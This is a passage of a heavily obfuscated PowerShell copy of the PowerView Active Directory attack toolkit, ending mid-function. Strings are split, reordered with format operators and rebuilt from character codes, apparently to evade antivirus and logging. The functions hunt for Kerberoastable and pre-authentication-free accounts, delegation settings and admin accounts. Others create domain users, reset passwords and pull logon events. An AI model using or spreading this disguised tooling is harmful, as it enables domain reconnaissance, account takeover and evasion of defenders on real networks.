            Write-Verbose (  '[Find' +  '-D'  +'omainObje'+  'c'+  'tPr' +  'oper'+ 'tyOu'  + 'tlier'  +  ']'  + ' '  +  'U'  + 'sing ' +'th'  + 'e '+'de'  + 'fault' +' '  + 're'+  'feren'+ 'ce ' +'p'+  'rope'+  'rty ' +'set'  +' ' + 'fo'+ 'r '  +  't'+  'he '  +  'obj' + 'ect ' + 'c'+  'l' + 'ass '+  "'$ClassName'"  )
        }

        if ((  $ClassName -eq ("{1}{0}" -f'er','Us'  )  ) -or (  $ReferenceObjectClass -eq (  "{1}{0}"-f'er','Us' )) ) {
            $Objects = Get-DomainUser @SearcherArguments
            if ( -not $ReferenceObjectProperties) {
                $ReferenceObjectProperties  = $UserReferencePropertySet
            }
        }
        elseif ((  $ClassName -eq ( "{0}{1}" -f 'G','roup'  )  ) -or ($ReferenceObjectClass -eq ("{1}{0}" -f 'oup','Gr')  )) {
            $Objects  = Get-DomainGroup @SearcherArguments
            if ( -not $ReferenceObjectProperties ) {
                $ReferenceObjectProperties =  $GroupReferencePropertySet
            }
        }
        elseif (  (  $ClassName -eq ( "{2}{0}{1}"-f'o','mputer','C') ) -or ($ReferenceObjectClass -eq ("{1}{0}{2}" -f 'pute','Com','r' ) )) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties  ) {
                $ReferenceObjectProperties =  $ComputerReferencePropertySet
            }
        }
        else {
            throw (  '['  + 'F'+  'ind-DomainO' + 'bj'  + 'e'+ 'ctP'  + 'ro' +  'pertyOutlie'  + 'r] ' +'Inva'+  'l' +  'id '  + 'clas'+'s: '+  "$ClassName"  )
        }

        ForEach (  $Object in $Objects  ) {
            $ObjectProperties   =  Get-Member -InputObject $Object -MemberType (  'Note'+ 'Pro'  +  'perty'  )   | Select-Object -Expand (  'N' + 'ame')
            ForEach(  $ObjectProperty in $ObjectProperties ) {
                if (  $ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out   =  New-Object (  'P'+'SObj' + 'ect' )
                    $Out |  Add-Member (  'No' +'t'+  'epr' +'operty'  ) ( "{3}{1}{0}{2}"-f'N','Account','ame','Sam' ) $Object.sAmAcCOUNTnamE
                    $Out  | Add-Member ( 'N'  + 'ote' +'pr' + 'operty') ( "{0}{1}{2}" -f 'Pr','opert','y') $ObjectProperty
                    $Out  | Add-Member ( 'N' + 'o'+ 'teproper'+ 'ty') ( "{0}{1}"-f'Va','lue') $Object.$ObjectProperty
                    $Out.PsoBJeCt.tYpeNAmEs.inseRT(  0, ( "{2}{5}{0}{6}{1}{3}{4}" -f'ro','tyO','PowerV','utl','ier','iew.P','per'  ))
                    $Out
                }
            }
        }
    }
}








function g`et-D`oMAi`N`USer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{5}{7}{6}{2}{1}{3}{4}"-f'PSU','dVar','e','sMoreTha','nAssignments','s','Declar','e'}, '' )]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{3}{2}{0}" -f's','PSShou','roces','ldP'}, '')]
    [OutputType( {"{3}{1}{0}{2}" -f'r','we','View.User','Po'} )]
    [OutputType(  {"{3}{1}{0}{2}"-f'iew.U','erV','ser.Raw','Pow'} )]
    [CmdletBinding(deFAultPArAmetErseTnAME  =   {"{0}{2}{1}{3}"-f 'Al','ow','l','Delegation'} )]
    Param(
        [Parameter( POSiTiOn  =  0, vALUefROmpipeLINE  =  $True, ValueFRompipELInEbYPrOpErTYnaMe =   $True  )]
        [Alias(  {"{4}{2}{3}{0}{1}"-f 'N','ame','ngui','shed','Disti'}, {"{3}{2}{1}{0}"-f'ame','tN','mAccoun','Sa'}, {"{0}{1}"-f 'Nam','e'}, {"{1}{2}{4}{0}{3}{5}" -f'isti','M','em','ngu','berD','ishedName'}, {"{2}{1}{0}"-f 'e','Nam','Member'}  )]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(  PARaMeterSetnamE   =  "ALLowD`E`Leg`ATiOn")]
        [Switch]
        $AllowDelegation,

        [Parameter( PArAmETerSEtNAME =   "dis`A`lLowdELegA`Ti`ON"  )]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias({"{0}{2}{1}{6}{7}{3}{5}{4}" -f 'K','ro','erbe','hNotReq','red','ui','s','Preaut'}, {"{1}{2}{0}"-f 'h','NoPre','aut'}  )]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{2}{0}{1}"-f 'te','r','Fil'}  )]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{1}{0}"-f'h','ADSPat'} )]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{3}{2}{4}{1}" -f 'Domain','r','troll','Con','e'})]
        [String]
        $Server,

        [ValidateSet( {"{0}{1}"-f'B','ase'}, {"{0}{1}{2}" -f 'O','n','eLevel'}, {"{0}{1}" -f'Subt','ree'}  )]
        [String]
        $SearchScope  =   ( "{1}{0}{2}" -f 'bt','Su','ree' ),

        [ValidateRange(  1, 10000)]
        [Int]
        $ResultPageSize =  200,

        [ValidateRange(1, 10000 )]
        [Int]
        $ServerTimeLimit,

        [ValidateSet( {"{1}{0}"-f 'acl','D'}, {"{1}{0}" -f 'p','Grou'}, {"{1}{0}"-f'ne','No'}, {"{0}{1}"-f 'O','wner'}, {"{1}{0}"-f 'cl','Sa'})]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias(  {"{0}{2}{1}"-f'Return','ne','O'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential   =  [Management.Automation.PSCredential]::eMpty,

        [Switch]
        $Raw
      )

    DynamicParam {
        $UACValueNames  = [Enum]::geTnAMES(  $UACEnum)
        
        $UACValueNames =  $UACValueNames |   ForEach-Object {$_  ;  "NOT_$_"}
        
        New-DynamicParameter -Name (  'UAC'+'Filt'  +  'e'+'r' ) -ValidateSet $UACValueNames -Type (  [array]  )
    }

    BEGIN {
        $SearcherArguments  = @{}
        if ($PSBoundParameters[(  "{0}{1}" -f 'Domai','n')]  ) { $SearcherArguments[( "{2}{1}{0}" -f 'ain','om','D' )]  =  $Domain }
        if ($PSBoundParameters[( "{2}{1}{0}"-f 'erties','rop','P')] ) { $SearcherArguments[("{2}{0}{1}" -f 'rtie','s','Prope' )]  =   $Properties }
        if ( $PSBoundParameters[("{2}{1}{0}" -f 'hBase','rc','Sea'  )] ) { $SearcherArguments[("{2}{1}{0}" -f'hBase','rc','Sea' )]   =   $SearchBase }
        if ( $PSBoundParameters[( "{1}{0}" -f'ver','Ser'  )]  ) { $SearcherArguments[(  "{1}{0}" -f'rver','Se' )] =   $Server }
        if ( $PSBoundParameters[("{0}{2}{1}" -f 'SearchSc','e','op')]  ) { $SearcherArguments[(  "{3}{0}{2}{1}" -f 'a','hScope','rc','Se' )] = $SearchScope }
        if (  $PSBoundParameters[( "{0}{2}{1}{3}" -f 'Result','ageS','P','ize'  )]  ) { $SearcherArguments[(  "{2}{1}{4}{3}{0}"-f 'ze','Pag','Result','i','eS')]   = $ResultPageSize }
        if ( $PSBoundParameters[(  "{0}{2}{1}{3}"-f 'S','verTimeL','er','imit'  )]) { $SearcherArguments[( "{2}{0}{1}{3}"-f'erv','erTimeL','S','imit'  )] = $ServerTimeLimit }
        if ($PSBoundParameters[(  "{4}{3}{0}{2}{1}"-f 'tyMas','s','k','ri','Secu' )] ) { $SearcherArguments[("{0}{2}{1}{3}"-f'Secu','it','r','yMasks')]   = $SecurityMasks }
        if ($PSBoundParameters[( "{2}{1}{0}" -f'ne','sto','Tomb'  )]  ) { $SearcherArguments[("{2}{1}{0}"-f 'ne','to','Tombs' )]   = $Tombstone }
        if ( $PSBoundParameters[(  "{2}{1}{0}" -f 'ial','redent','C' )]  ) { $SearcherArguments[(  "{1}{2}{0}" -f 'al','C','redenti')]  =  $Credential }
        $UserSearcher   = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        if (  $PSBoundParameters -and ($PSBoundParameters.COunT -ne 0 )  ) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if (  $UserSearcher  ) {
            $IdentityFilter  = ''
            $Filter  = ''
            $Identity   |   Where-Object {$_} |  ForEach-Object {
                $IdentityInstance  =  $_.REPlACe(  '(', '\28' ).RePLace(')', '\29')
                if ( $IdentityInstance -match ( "{1}{0}" -f '-','^S-1')) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif (  $IdentityInstance -match ("{0}{1}"-f'^','CN=' )  ) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ( (-not $PSBoundParameters[("{1}{2}{0}" -f 'ain','D','om' )]) -and (-not $PSBoundParameters[("{2}{1}{0}" -f 'e','hBas','Searc' )]) ) {
                        
                        
                        $IdentityDomain =   $IdentityInstance.sUBsTriNG(  $IdentityInstance.InDeXof(  'DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose ('[Get'  +  '-Doma' + 'inUse' +  'r'+'] '  + 'Ex'+ 't'  + 'racted'+  ' '  +  'd'+  'omain '+  "'$IdentityDomain' " + 'from'+  ' ' +"'$IdentityInstance'"  )
                        $SearcherArguments[(  "{1}{0}" -f'omain','D')]  = $IdentityDomain
                        $UserSearcher  =   Get-DomainSearcher @SearcherArguments
                        if ( -not $UserSearcher ) {
                            Write-Warning (  '[G'  +  'et' +'-D' +  'omain'  + 'Use'+  'r] '+'Unable' +  ' '  +  'to'  +  ' ' +'retr'+  'i'+'eve' +  ' '+ 'do' +  'm'  + 'ain ' +  'searche'  + 'r'+ ' '+'for'  + ' ' +  "'$IdentityDomain'"  )
                        }
                    }
                }
                elseif (  $IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$' ) {
                    $GuidByteString  =   ( ( [Guid]$IdentityInstance  ).ToByTeARrAY(   )  |   ForEach-Object { '\'   + $_.TOstrINg('X2') } ) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif (  $IdentityInstance.CONtaIns(  '\' ) ) {
                    $ConvertedIdentityInstance  = $IdentityInstance.rEplAcE(  '\28', '(').repLacE('\29', ')'  ) | Convert-ADName -OutputType ('Canon' + 'ica' +'l'  )
                    if (  $ConvertedIdentityInstance  ) {
                        $UserDomain  = $ConvertedIdentityInstance.SUbSTrINg(0, $ConvertedIdentityInstance.iNdexOF('/'  ))
                        $UserName   = $IdentityInstance.SpLIT( '\'  )[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments[(  "{1}{0}"-f 'omain','D' )]  =  $UserDomain
                        Write-Verbose ('[Ge'+  't-' +  'Domain'+ 'User]'  +  ' '+  'Ext' + 'r' + 'acted'+ ' ' + 'do'  +'main ' +"'$UserDomain' "+ 'fr'+ 'om '  +"'$IdentityInstance'" )
                        $UserSearcher =  Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ( $IdentityFilter.TrIm( ) -ne '')  ) {
                $Filter += "(|$IdentityFilter)"
            }

            if (  $PSBoundParameters['SPN']  ) {
                Write-Verbose ( "{3}{9}{6}{1}{4}{7}{5}{10}{8}{0}{2}"-f 'pal ','arch','names','[Get','ing','l s','er] Se',' for non-nul','i','-DomainUs','ervice princ'  )
                $Filter += (  ( "{5}{0}{4}{1}{2}{3}" -f'servicePri','e=','*',')','ncipalNam','(') )
            }
            if (  $PSBoundParameters[( "{3}{2}{1}{0}" -f'gation','le','e','AllowD')]  ) {
                Write-Verbose ( "{3}{9}{8}{13}{15}{2}{1}{10}{14}{12}{0}{11}{6}{4}{7}{5}"-f 'wh','r','g fo','[Get',' ','ed','an','be delegat','omainUse','-D',' u','o c','ers ','r] Searchi','s','n'  )
                
                $Filter += ( "{4}{1}{9}{0}{7}{5}{2}{11}{3}{6}{10}{8}"-f 'l:1.','(userA','3','0','(!','0.11','3:','2.84','))','ccountContro','=1048574','556.1.4.8')
            }
            if ($PSBoundParameters[( "{2}{3}{1}{0}"-f 'on','legati','Dis','allowDe' )]  ) {
                Write-Verbose ( "{2}{16}{9}{20}{7}{18}{10}{6}{1}{12}{4}{13}{22}{11}{0}{19}{17}{23}{21}{8}{5}{15}{24}{3}{14}" -f 't',' a','[Ge','ati','se',' de','o',' Searchi','for','Us','rs wh','i','re ','n','on','l','t-Domain','ve and no','ng for use','i','er]','d ','s','t truste','eg' )
                $Filter += (  ( "{6}{4}{10}{7}{1}{0}{3}{5}{9}{8}{2}"-f '.','.2.840','574)','1135','Accoun','56.1','(user','1','048','.4.803:=1','tControl:'  )  )
            }
            if ( $PSBoundParameters[(  "{0}{2}{1}{3}" -f'Adm','nC','i','ount')] ) {
                Write-Verbose ("{8}{5}{12}{7}{6}{0}{2}{3}{9}{11}{1}{10}{4}"-f'Us','r ','er','] Searchi','t=1','e','omain','D','[G','ng ','adminCoun','fo','t-'  )
                $Filter += ("{1}{0}{3}{2}"-f 'inc','(adm','nt=1)','ou'  )
            }
            if ( $PSBoundParameters[(  "{1}{3}{0}{2}"-f'u','Tru','th','stedToA' )]  ) {
                Write-Verbose (  "{6}{18}{7}{12}{1}{11}{10}{16}{2}{3}{13}{5}{0}{8}{17}{9}{15}{4}{14}"-f't','hing','rs that ar','e trusted to auth','rincipa','ica','[Get-','o','e','for ',' ',' for','mainUser] Searc','ent','ls','other p','use',' ','D'  )
                $Filter += (  ( "{5}{6}{0}{3}{4}{1}{7}{2}" -f'we','ate','o=*)','dtode','leg','(','msds-allo','t' ))
            }
            if (  $PSBoundParameters[(  "{1}{4}{3}{0}{2}" -f 'Requir','Pr','ed','authNot','e'  )]  ) {
                Write-Verbose ( "{2}{9}{11}{14}{4}{7}{10}{15}{18}{17}{3}{0}{8}{13}{16}{6}{5}{12}{1}"-f'that do','ticate','[Get','ts ','arc','ros preauth','rbe','h',' ','-','i','DomainUser]','en','not require',' Se','ng for user',' ke','oun',' acc' )
                $Filter += (  "{1}{6}{0}{7}{8}{4}{2}{5}{3}" -f'ntr','(','556.1.',':=4194304)','40.113','4.803','userAccountCo','o','l:1.2.8' )
            }
            if ($PSBoundParameters[( "{2}{3}{0}{1}" -f'l','ter','LD','APFi')]  ) {
                Write-Verbose (  '[Get-D'+'om' + 'ain' +'User'+ ']' + ' '  + 'Us'+'in'+'g '+ 'addi'+  'tio' +'na' + 'l ' + 'LDA'  +'P ' +'fil'+ 'ter' + ': '+"$LDAPFilter"  )
                $Filter += "$LDAPFilter"
            }

            
            $UACFilter | Where-Object {$_}  |  ForEach-Object {
                if (  $_ -match (  "{0}{1}"-f'NOT_','.*'  )) {
                    $UACField   =  $_.substrING( 4  )
                    $UACValue  = [Int]( $UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue  =  [Int]($UACEnum::$_ )
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $UserSearcher.fiLtEr   = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if ($PSBoundParameters[("{0}{1}{2}"-f'F','indOn','e')]) { $Results  = $UserSearcher.FIndONe() }
            else { $Results =   $UserSearcher.FIndalL(  ) }
            $Results   |  Where-Object {$_}  |   ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $User =  $_
                    $User.PSobjECt.tyPeNAMEs.INSeRT(  0, (  "{0}{4}{3}{1}{2}"-f'PowerView.U','a','w','er.R','s' )  )
                }
                else {
                    $User   = Convert-LDAPProperty -Properties $_.pRopertIeS
                    $User.psObjECT.typEnaMEs.INsert(  0, ( "{3}{1}{2}{0}" -f 'w.User','V','ie','Power')  )
                }
                $User
            }
            if ( $Results) {
                try { $Results.diSPoSe() }
                catch {
                    Write-Verbose ( '[Get-D'+ 'omainUse'+'r'  + '] '+ 'Erro'  +  'r '+'di'+ 's'+  'posing '+  'o' +'f '+'th'+  'e '+ 'R'+  'esu'+'lts ' + 'obj'  + 'ect' +': '  +  "$_")
                }
            }
            $UserSearcher.DiSPOsE(  )
        }
    }
}


function neW`-`D`oM`AiNUsEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{9}{10}{6}{5}{4}{8}{3}{7}{2}{0}{1}"-f'c','tions','ingFun','eCha','o','houldProcessF','eS','ng','rStat','PS','Us'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{0}{3}{2}{1}" -f 'S','s','ldProces','hou','PS'}, ''  )]
    [OutputType({"{7}{5}{1}{9}{11}{13}{8}{0}{12}{2}{10}{4}{3}{6}"-f'geme','rySer','t.UserPri','a','ip','cto','l','Dire','na','vi','nc','ces.Accoun','n','tMa'} )]
    Param(  
        [Parameter( MAnDAToRY =  $True)]
        [ValidateLength( 0, 256 )]
        [String]
        $SamAccountName,

        [Parameter(mAnDAtoRy  =  $True )]
        [ValidateNotNullOrEmpty(   )]
        [Alias( {"{2}{0}{1}" -f'wo','rd','Pass'}  )]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty(    )]
        [String]
        $Name,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $DisplayName,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Description,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =   [Management.Automation.PSCredential]::emPTY
    )

    $ContextArguments   =   @{
        (  "{1}{2}{0}" -f 'y','Identi','t' )   = $SamAccountName
    }
    if ( $PSBoundParameters[( "{0}{2}{1}" -f'D','ain','om' )]  ) { $ContextArguments[(  "{1}{0}"-f'main','Do')]   = $Domain }
    if (  $PSBoundParameters[("{2}{1}{0}"-f'tial','den','Cre')]  ) { $ContextArguments[("{0}{2}{1}" -f 'Crede','l','ntia')] = $Credential }
    $Context =  Get-PrincipalContext @ContextArguments

    if ( $Context ) {
        $User   =  New-Object -TypeName (  'Syste'  +  'm.Direct' + 'orySe' +'rvices.'+  'Acco'  +'u' +  'ntMa'  +'nageme' +  'nt.Use' +'rP'+ 'r'  +'i'  +'nci'+ 'pal') -ArgumentList ($Context.cONTExT )

        
        $User.sAmaCCOuNtname =   $Context.iDENtitY
        $TempCred   =   New-Object ('S'  +'ys' +'t' +  'em'+ '.' + 'Ma' + 'nagement.Au'  +  'tom' + 'ation.' +'P'+  'SCredential')(  'a', $AccountPassword)
        $User.SetpAssworD( $TempCred.GEtNEtwORkCrEdENTiAL(   ).PaSSwORd )
        $User.enABLEd  =   $True
        $User.pASsWOrDNOtreQuiRed =  $False

        if ( $PSBoundParameters[( "{0}{1}"-f 'Na','me'  )]  ) {
            $User.NAMe  =   $Name
        }
        else {
            $User.naME   = $Context.IdEnTITY
        }
        if (  $PSBoundParameters[("{3}{1}{0}{2}"-f'p','s','layName','Di')]) {
            $User.DIsplaYNaMe =  $DisplayName
        }
        else {
            $User.DiSpLAynAmE = $Context.IDEntitY
        }

        if (  $PSBoundParameters[( "{0}{3}{2}{1}"-f'D','ion','pt','escri'  )] ) {
            $User.desCrIpTIon   =  $Description
        }

        Write-Verbose ('[N' + 'ew-Do'+'m' + 'ainUser] '+'At' + 'tempt' +'ing ' +'to'+' '  +  'creat'+  'e'+' '+'us'  +'er '  +  "'$SamAccountName'"  )
        try {
            $Null   =  $User.SaVE()
            Write-Verbose (  '[New-'+ 'Do'+ 'mainUser]'+  ' '+'Us'  +  'er ' +"'$SamAccountName' "  +  'succ'+'essf'  +  'ully'  + ' '  +'creat'+'e' +'d')
            $User
        }
        catch {
            Write-Warning ( '[New-'+ 'Doma'+ 'inUs'  +'e'  + 'r] ' +'Error' +  ' ' +  'cr'+'e'+  'ating ' + 'u'  + 'ser '+ "'$SamAccountName' "+': ' +  "$_")
        }
    }
}


function SEt-`Do`M`AInuseRPa`SSw`oRd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{4}{8}{5}{0}{3}{2}{1}{7}{9}{10}{6}" -f'uldProc','te','a','essForSt','PS','eSho','nctions','Chan','Us','gingF','u'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{4}{2}{0}"-f 'dProcess','SS','ul','P','ho'}, '')]
    [OutputType(  {"{7}{5}{10}{12}{3}{6}{2}{0}{8}{11}{1}{4}{9}{13}{14}" -f'untM','e','co','.A','ment','ct','c','Dire','ana','.User','orySe','g','rvices','Principa','l'}  )]
    Param(
        [Parameter(  POSitiON =  0, MaNdaTOry   =  $True  )]
        [Alias(  {"{0}{1}" -f 'UserN','ame'}, {"{2}{1}{0}{3}"-f'entit','serId','U','y'}, {"{1}{0}"-f 'ser','U'}  )]
        [String]
        $Identity,

        [Parameter(  MAnDAtory   =   $True)]
        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{1}{2}{0}"-f 'word','Pa','ss'})]
        [Security.SecureString]
        $AccountPassword,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential = [Management.Automation.PSCredential]::emptY
     )

    $ContextArguments  = @{ (  "{0}{2}{1}" -f'I','ity','dent')  =  $Identity }
    if (  $PSBoundParameters[( "{2}{0}{1}" -f'oma','in','D' )]) { $ContextArguments[( "{1}{0}"-f 'omain','D'  )]  =  $Domain }
    if ( $PSBoundParameters[( "{2}{0}{1}" -f 'redenti','al','C')]) { $ContextArguments[(  "{1}{2}{0}"-f 'ial','Cr','edent')]   = $Credential }
    $Context  =  Get-PrincipalContext @ContextArguments

    if ($Context  ) {
        $User  =  [System.DirectoryServices.AccountManagement.UserPrincipal]::fINdBYideNTitY( $Context.CONteXt, $Identity)

        if ($User ) {
            Write-Verbose ('[' +'Set-'+'Dom'  + 'ain'+'Use'  +  'rP'  +'asswor' + 'd] '+'At' +'t' +'empt'  +'ing '  +  't'+ 'o '+'se'  +'t '  +'the'+' '+'pas'  +'sw' +  'ord '+  'f' +'or '+  'user'+  ' '  +  "'$Identity'"  )
            try {
                $TempCred =   New-Object ('System.'+'Management.'+'Automa'+'tion'+  '.P'  + 'SCrede' +'n'  + 'tial' )(  'a', $AccountPassword )
                $User.SetpaSswOrD( $TempCred.gETNeTworkcRedENtial(   ).pASSwoRD )

                $Null  = $User.Save(  )
                Write-Verbose ('[Set-Domain' + 'UserPasswor' + 'd'  + ']'  + ' ' +'P'  + 'asswor' +  'd ' +'fo'  +'r ' + 'u' +  'ser '+ "'$Identity' "  + 'suc'  +'ces'+'sfully' + ' ' +  'r' +'eset'  )
            }
            catch {
                Write-Warning ( '[Se'  +'t-Domai'  + 'n'+'Us'+ 'e' +'rP' + 'a'+ 'ssword] '  +  'Er'+  'ro' +'r ' + 's'+ 'e'+ 'tting ' + 'pass'+  'wor'  + 'd '+ 'fo'+  'r ' +  'u' + 'ser '+ "'$Identity' " +': '+"$_"  )
            }
        }
        else {
            Write-Warning ('[Set'+ '-Dom' +  'ai' +  'nUserPa' +'ssword] '+  'U' +  'nable ' + 't'+  'o '  +  'fi' +'nd '+ 'us'+ 'er '  +  "'$Identity'"  )
        }
    }
}


function Ge`T-DoMaInuSeRev`E`Nt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{0}{2}{1}"-f'PS','ss','ShouldProce'}, '' )]
    [OutputType(  {"{1}{0}{2}{3}"-f'rView.Logon','Powe','Eve','nt'} )]
    [OutputType(  {"{2}{3}{4}{0}{5}{1}{6}" -f 'icitCrede','ven','Pow','erView.','Expl','ntialLogonE','t'}  )]
    [CmdletBinding(  )]
    Param( 
        [Parameter( PoSitiON = 0, VALuEfrOMpiPelIne  = $True, VaLUEFrOmpIpELinEbYprOPerTYNAme =   $True  )]
        [Alias(  {"{0}{1}{2}" -f'd','nshost','name'}, {"{0}{2}{1}"-f'H','tName','os'}, {"{0}{1}" -f 'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName   =   $Env:COMPUTERNAME,

        [ValidateNotNullOrEmpty(   )]
        [DateTime]
        $StartTime   = [DateTime]::NoW.aDDDAYs(-1  ),

        [ValidateNotNullOrEmpty(   )]
        [DateTime]
        $EndTime   =   [DateTime]::noW,

        [ValidateRange(1, 1000000  )]
        [Int]
        $MaxEvents  =   5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential  =  [Management.Automation.PSCredential]::EMpTY
      )

    BEGIN {
        
        $XPathFilter   =  ( ( '{0}
<'+'Que'+ 'ryLi' +'st>
 '  )-F[ChAr]34 +  ' '  +' ' +' '+'<Q' + 'uery '+('Id=w'  + 'Pr0' +'w'  +  'Pr ' ).rEpLAcE(( [ChAR]119  +  [ChAR]80  +[ChAR]114 ),[STRINg][ChAR]34  )  + (('Pat' +  'h=0qL'+'Securit'+ 'y0qL>
' + '
 '  ) -repLAcE ([chaR]48  + [chaR]113  +[chaR]76  ),[chaR]34)+' '  + ' '  +' ' +  ' '+  ' ' + ' ' +  ' '+ '<!'  +'-- '  +  'L'+  'og'+  'on ' +  'even'  +  'ts ' +  '--' +'>
 '  + ' '  +  ' '  +  ' '  +' ' +' '+ ' '+  ' ' + '<Sel' + 'ect ' + ( (  'Pa'  +'t'+'h=OLhSecuri' + 'tyO' + 'Lh>
 ' ) -crePLAce  'OLh',[char]34  )+  ' ' +  ' ' +' '  + ' '  +  ' '  +  ' '  + ' '  +  ' '  + ' '+  ' ' +  ' '  +'*'  +'[
 '+' ' +  ' '  +' ' +  ' '+  ' '  +  ' '+ ' '+  ' '+' '  +  ' '  + ' '+ ' '+' '+' '+  ' '+'S' +'ystem[
 ' + ' ' + ' '  +  ' '+' '+ ' '+' '  + ' '+ ' '+ ' '  +' '+ ' ' +' '  +' '+  ' '+  ' ' + ' '+' ' + ' ' + ' '  + 'Pr'  +  'ovid' +'er'  +  '[
 '  +  ' '+ ' '+  ' '+ ' '+' ' + ' '+  ' '  +' '  + ' '+' '+ ' '  +  ' ' +  ' '  + ' '+  ' ' + ' '  + ' ' +' '  +' '  +' ' +  ' '  +' '+ ' '  + ( (  '@'  +  'N'+'ame' +'=bj'  +'N'+'Micros' + 'o'  +'f'+  't-W'+ 'indow' + 's' +  '-S' + 'ecurity-Auditingb' + 'j'  +  'N
 ')-crePlace  'bjN',[CHar]39)+' '+  ' '+ ' '  +' ' + ' '  + ' ' +' '  + ' '  +  ' ' +  ' '  +  ' '  + ' '  +  ' '  +' '  +' '  +' '+' '+  ' '+ ' '  + ']'+  '
 '+ ' ' + ' '+ ' ' + ' '+' ' + ' '  +' ' + ' '+ ' '+ ' '  +  ' ' +  ' ' +  ' '  +  ' ' +' '  + ' ' +' ' +' '+ ' ' + 'an' +  'd ' +  '(Le'+ 'vel=4'+' '+'or'  +  ' ' + 'Level='  +  '0)' + ' '  + 'an'  +  'd '+  '(E' + 've'  +  'ntID='+'4624)
 '+ ' '+' '+  ' ' + ' '  +  ' ' + ' '+' ' +' ' + ' ' +  ' '  +  ' '  + ' '+' ' + ' ' + ' '+ ' ' +  ' ' + ' '  +  ' '+  'an' +'d '  +'Time' +  'Cre' +'ate'  + 'd['+  '
 '  + ' '+' '  + ' ' +' '  +' '  + ' '  +  ' ' +' '  +  ' '+' ' +' ' +  ' '  +' '  +  ' '+ ' '+  ' '  +' ' + ' '  +' '+  ' '  + ' ' +' ' +' '+  ( ('@Sys' + 't'  +  'emT' +  'i'+ 'me' +  '&gt' +';=l'  + '5'+  'i' +'6Y' +  'p' + '(6YpStartTime.' +'T' +  'oUni'+ 'ver'  +  'salTi'+'m'+ 'e' +  '()'+  '.T'  + 'oSt' +'ring(l5isl5i'  +'))l5i '  )-ReplacE  ([CHAR]54  +  [CHAR]89+  [CHAR]112  ),[CHAR]36-CREPlAcE'l5i',[CHAR]39 )  + 'an'  +'d '+  ( '@Sys'  + 't'+  'emTime'  +'&l'+ 't;='  + '{0}{1}({1}'+'EndTime.'  +  'To'+'U' + 'n'+ 'i' +  'versalTime('  + ')'  +  '.ToString({0}'  +'s{0})'+  '){0}
 '  ) -F [CHAr]39,[CHAr]36+' '+ ' ' +' '+' ' +  ' '+ ' '  +' ' +  ' ' + ' '+' '+' '+' '+' '+ ' '  +' ' +' '  + ' '+' ' +' '+ ']'+  '
 '+' ' + ' '  +  ' '+  ' '+  ' '+ ' ' +  ' '  +  ' '+  ' '  +  ' ' +' '  +  ' '  + ' '+ ' '+ ' '  + ']' +'
 ' + ' '  + ' ' +  ' '  + ' '+' ' +  ' '  +  ' '+' ' +' '+  ' '+  ' ' +']' +  '
 '  +  ' '  +  ' '+  ' '+' ' +' '+' '+  ' '+ ' '  + ' '+ ' '+  ' '+ 'a'  +'nd
 ' +  ' '+' '  +' '+  ' '  +  ' '+  ' ' + ' '+ ' ' +  ' '  +  ' '  +' '  +  (('*' +'[Ev'+ 'ent'  + 'Dat' +  'a[' +'Dat' + 'a[@Name=c6'+ 'OTargetUser'  + 'N'  +  'am' + 'ec6O] ' )-RePlAce( [CHAr]99+[CHAr]54 +[CHAr]79 ),[CHAr]39  )  +'!='+ ' '  +(  '{0' + '}A'  +  'NO' + 'NYMOUS ') -F  [CHAR]39  +  (( 'LOGON6'+  'kw]]
